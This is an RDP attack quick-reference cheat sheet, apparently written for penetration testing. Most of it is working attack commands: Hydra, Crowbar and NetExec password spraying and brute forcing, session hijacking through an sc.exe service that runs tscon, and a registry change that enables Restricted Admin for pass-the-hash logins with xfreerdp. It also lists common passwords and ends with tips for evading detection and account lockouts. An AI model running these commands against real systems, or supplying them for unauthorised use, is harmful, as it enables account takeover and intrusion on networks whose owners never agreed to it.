# RDP Attack Quick Reference

## Default Port
- **RDP**: 3389 (TCP)

## Enumeration

```bash
# Basic scan
nmap -Pn -p3389 TARGET

# Detailed scan
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption TARGET
```

## Password Attacks

### Crowbar (Password Spray)
```bash
# Single password, multiple users
crowbar -b rdp -s TARGET/32 -U users.txt -c 'password123'

# Multiple passwords
crowbar -b rdp -s TARGET/32 -u admin -C passwords.txt
```

### Hydra
```bash
# Password spray (recommended for RDP)
hydra -L users.txt -p 'Password123' rdp://TARGET

# Brute force (use low threads!)
hydra -l administrator -P passwords.txt rdp://TARGET -t 1

# With custom port
hydra -l admin -P passwords.txt rdp://TARGET:3390 -t 1
```

**Important**: Use `-t 1` or `-t 4` to avoid overwhelming RDP server

### NetExec
```bash
# Password spray
nxc rdp TARGET -u users.txt -p 'Password123'

# Single user
nxc rdp TARGET -u admin -p passwords.txt
```

## Connect to RDP

### xfreerdp (Recommended)
```bash
# Basic connection
xfreerdp /v:TARGET /u:username /p:'password'

# Full options
xfreerdp /v:TARGET /u:username /p:'password' /cert:ignore /dynamic-resolution +clipboard

# With domain
xfreerdp /v:TARGET /u:username /p:'password' /d:DOMAIN /cert:ignore

# Custom port
xfreerdp /v:TARGET:3390 /u:username /p:'password'
```

### rdesktop (Alternative)
```bash
# Basic
rdesktop -u username -p password TARGET

# Full screen
rdesktop -u username -p password -f TARGET

# Custom resolution
rdesktop -u username -p password -g 1920x1080 TARGET
```

## RDP Session Hijacking (Local Admin Required)

### Prerequisites
- Local administrator privileges on target
- Target user logged in via RDP
- Need SYSTEM privileges

### Step 1: Identify sessions
```cmd
query user

# Output shows:
# USERNAME    SESSIONNAME    ID  STATE
# admin       rdp-tcp#13     1   Active
# victim      rdp-tcp#14     2   Active
```

### Step 2: Create hijack service
```cmd
# Create service to hijack session ID 2 to your session (rdp-tcp#13)
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

### Step 3: Start service
```cmd
net start sessionhijack
```

**Result**: New terminal opens as hijacked user

**Note**: Doesn't work on Server 2019+

## RDP Pass-the-Hash (PtH)

### Requirements
- NT hash of target user
- Restricted Admin Mode enabled on target

### Enable Restricted Admin Mode (on target)
```cmd
# Add registry key
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Connect with hash
```bash
xfreerdp /v:TARGET /u:username /pth:NTHASH
```

**Example**:
```bash
xfreerdp /v:192.168.220.152 /u:administrator /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

**Note**: Doesn't always work, but worth trying when you have NT hash

## Quick Attack Workflows

### Workflow 1: Password spray
```bash
# 1. Create user list
echo -e "administrator\nadmin\nuser\nguest" > users.txt

# 2. Password spray with Hydra
hydra -L users.txt -p 'Password123' rdp://TARGET -t 4

# 3. Connect with found creds
xfreerdp /v:TARGET /u:administrator /p:'Password123' /cert:ignore
```

### Workflow 2: Session hijacking
```cmd
# 1. Check sessions
query user

# 2. Get SYSTEM (via service creation)
sc.exe create sessionhijack binpath= "cmd.exe /k tscon TARGET_ID /dest:YOUR_SESSION"

# 3. Start service
net start sessionhijack

# 4. New window opens as target user
whoami
```

### Workflow 3: Pass-the-Hash
```bash
# 1. Obtain NT hash (from SAM dump, mimikatz, etc.)
# Hash: 300FF5E89EF33F83A8146C10F5AB9BB9

# 2. Attempt PtH RDP
xfreerdp /v:TARGET /u:administrator /pth:300FF5E89EF33F83A8146C10F5AB9BB9

# 3. If error about Restricted Admin Mode, enable it first on target
```

## Common RDP Ports
- **3389** - Default
- **3390** - Common alternative
- **33389** - Sometimes used

## Password Spray Best Practices

```bash
# Low and slow (avoid lockouts)
hydra -L users.txt -p 'Password123' rdp://TARGET -t 1 -w 10

# Options:
# -t 1   = 1 task at a time
# -w 10  = 10 second wait between attempts
```

## Common Passwords for RDP

```
Password123
Welcome1
P@ssw0rd
Summer2024
Winter2024
Company123
Admin123
```

## Tools Comparison

| Tool | Best For | Speed |
|------|----------|-------|
| **Hydra** | Password spraying | Fast |
| **Crowbar** | RDP-specific attacks | Medium |
| **NetExec** | Active Directory | Fast |
| **xfreerdp** | Connecting (supports PtH) | N/A |
| **rdesktop** | Connecting (basic) | N/A |

## Troubleshooting

### Connection issues
```bash
# Ignore certificate errors
xfreerdp /v:TARGET /u:user /p:pass /cert:ignore

# Disable NLA
xfreerdp /v:TARGET /u:user /p:pass +auth-only /cert:ignore
```

### PtH fails
- Check if Restricted Admin Mode is enabled
- Try from Windows instead of Linux
- Verify NT hash is correct (32 hex characters)

### Session hijacking fails
- Need SYSTEM privileges first
- Use `psexec -s` or `mimikatz` to get SYSTEM
- Server 2019+ blocks this technique

## Quick Commands

| Task | Command |
|------|---------|
| **Scan RDP** | `nmap -p3389 TARGET` |
| **Password spray** | `hydra -L users.txt -p 'Pass' rdp://TARGET -t 4` |
| **Connect** | `xfreerdp /v:TARGET /u:user /p:'pass' /cert:ignore` |
| **List sessions** | `query user` |
| **Hijack session** | `tscon SESSION_ID /dest:YOUR_SESSION` |
| **PtH RDP** | `xfreerdp /v:TARGET /u:user /pth:HASH` |
| **Enable Restricted Admin** | `reg add HKLM\...\Lsa /v DisableRestrictedAdmin /d 0x0` |

## Detection Evasion

- Use `-t 1` or `-t 4` for slower attacks
- Wait between attempts (`-w 10`)
- One password against many users (not many passwords per user)
- Monitor for account lockout policies
